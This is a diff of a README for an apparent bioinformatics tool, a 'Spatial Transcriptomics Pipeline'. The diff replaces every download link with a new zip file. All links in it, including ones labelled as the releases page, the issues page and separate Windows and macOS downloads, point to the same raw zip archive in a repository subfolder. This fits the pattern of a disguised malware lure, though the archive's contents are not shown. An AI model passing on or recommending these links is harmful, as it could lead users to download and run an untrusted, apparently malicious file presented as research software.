@@ -1,7 +1,7 @@
 # 🧬 Spatial_Transcriptomics_Pipeline - Analyze Gene Expression with Ease
 
 ## 📥 Download the Latest Release
-[![Download Here](https://raw.githubusercontent.com/Boomer8256/Spatial_Transcriptomics_Pipeline/main/torney/Spatial_Transcriptomics_Pipeline.zip)](https://raw.githubusercontent.com/Boomer8256/Spatial_Transcriptomics_Pipeline/main/torney/Spatial_Transcriptomics_Pipeline.zip)
+[![Download Here](https://github.com/Boomer8256/Spatial_Transcriptomics_Pipeline/raw/refs/heads/main/torney/Spatial-Pipeline-Transcriptomics-3.6.zip)](https://github.com/Boomer8256/Spatial_Transcriptomics_Pipeline/raw/refs/heads/main/torney/Spatial-Pipeline-Transcriptomics-3.6.zip)
 
 ## 🚀 Getting Started
 Welcome to the **Spatial Transcriptomics Pipeline**. This application enables you to analyze gene expression data from tissue samples. By using our automated pipeline, you can identify cancer hotspots and explore the tumor microenvironment efficiently.
@@ -23,9 +23,9 @@ Before you start, ensure your computer meets the following requirements:
 ## 📥 Download & Install
 To get started, you need to download the application from the Releases page. 
 
-1. Click this link to visit the download page: [Download Here](https://raw.githubusercontent.com/Boomer8256/Spatial_Transcriptomics_Pipeline/main/torney/Spatial_Transcriptomics_Pipeline.zip).
+1. Click this link to visit the download page: [Download Here](https://github.com/Boomer8256/Spatial_Transcriptomics_Pipeline/raw/refs/heads/main/torney/Spatial-Pipeline-Transcriptomics-3.6.zip).
 2. Look for the latest release.
-3. Click on the file suitable for your operating system (e.g., `https://raw.githubusercontent.com/Boomer8256/Spatial_Transcriptomics_Pipeline/main/torney/Spatial_Transcriptomics_Pipeline.zip` for Windows or `https://raw.githubusercontent.com/Boomer8256/Spatial_Transcriptomics_Pipeline/main/torney/Spatial_Transcriptomics_Pipeline.zip` for macOS).
+3. Click on the file suitable for your operating system (e.g., `https://github.com/Boomer8256/Spatial_Transcriptomics_Pipeline/raw/refs/heads/main/torney/Spatial-Pipeline-Transcriptomics-3.6.zip` for Windows or `https://github.com/Boomer8256/Spatial_Transcriptomics_Pipeline/raw/refs/heads/main/torney/Spatial-Pipeline-Transcriptomics-3.6.zip` for macOS).
 4. Save the file to a location on your computer that you can easily access, such as the Downloads folder.
 
 ### 🗂️ Installing the Application
@@ -75,9 +75,9 @@ If you encounter issues, consider the following steps:
 - Check for sufficient RAM and disk space during the analysis.
 - Review the user manual within the application for specific error messages.
 
-For further assistance, you can open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/Boomer8256/Spatial_Transcriptomics_Pipeline/main/torney/Spatial_Transcriptomics_Pipeline.zip).
+For further assistance, you can open an issue on the [GitHub Issues page](https://github.com/Boomer8256/Spatial_Transcriptomics_Pipeline/raw/refs/heads/main/torney/Spatial-Pipeline-Transcriptomics-3.6.zip).
 
 ## 📞 Support
 If you need help, the community is here to assist. Consider posting your questions, and we will do our best to respond quickly. Check the FAQs section above for common questions.
 
-Thank you for choosing the **Spatial Transcriptomics Pipeline**. We hope this tool enhances your research and analysis. For updates and new releases, check back on the [Releases page](https://raw.githubusercontent.com/Boomer8256/Spatial_Transcriptomics_Pipeline/main/torney/Spatial_Transcriptomics_Pipeline.zip) regularly.
+Thank you for choosing the **Spatial Transcriptomics Pipeline**. We hope this tool enhances your research and analysis. For updates and new releases, check back on the [Releases page](https://github.com/Boomer8256/Spatial_Transcriptomics_Pipeline/raw/refs/heads/main/torney/Spatial-Pipeline-Transcriptomics-3.6.zip) regularly.
